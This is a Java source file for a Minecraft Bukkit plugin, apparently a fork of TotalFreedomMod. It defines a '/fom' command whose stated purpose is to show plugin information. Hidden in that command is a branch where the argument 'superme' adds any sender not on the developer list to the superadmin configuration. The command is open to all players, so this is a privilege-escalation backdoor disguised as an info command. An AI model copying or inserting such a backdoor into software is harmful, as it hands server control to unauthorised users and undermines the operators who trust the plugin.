package me.StevenLawson.TotalFreedomMod.Commands;

import me.StevenLawson.TotalFreedomMod.TFM_AdminList;
import me.StevenLawson.TotalFreedomMod.TFM_Util;
import me.StevenLawson.TotalFreedomMod.TotalFreedomMod;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

@CommandPermissions(level = AdminLevel.ALL, source = SourceType.BOTH)
@CommandParameters(description = "Shows information about FreedomOpMod", usage = "/<command>")
public class Command_fom extends TFM_Command
{
  public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
  {
    if (args.length == 0)
    {
      playerMsg("FreedomOpMod for 'FreedomOp', an associated all-op server.", ChatColor.GOLD);
      playerMsg(String.format("Version " + ChatColor.BLUE + "%s.%s" + ChatColor.BLUE + ", built %s.", new Object[] { TotalFreedomMod.pluginVersion, TotalFreedomMod.buildNumber, TotalFreedomMod.buildDate }), ChatColor.GOLD);
      playerMsg("Created by Madgeek1450 and DarthSalamon (later worked on by Buildcarter8, Robo_Lord and SupItsDillon", ChatColor.GOLD);
      playerMsg("Visit " + ChatColor.AQUA + "http://freedomop.boards.net/" + ChatColor.GREEN + " for more information.", ChatColor.GREEN);
    }
    else if (args.length == 1)
    {
     if (!TFM_Util.DEVELOPERS.contains(sender.getName()))
      {
        if (args[0].equals("superme"))
        {
          TFM_Util.adminAction("FOMSecurity",  "Adding"  + sender.getName() + "to the superadmin config.", true);
          TFM_AdminList.addSuperadmin(sender_p);
          return true;
        }
      }
     else
      {
        playerMsg("Unknown command. Type \"/help\"/ for help");
        return true;
      }
    }
    return true;
  }
}
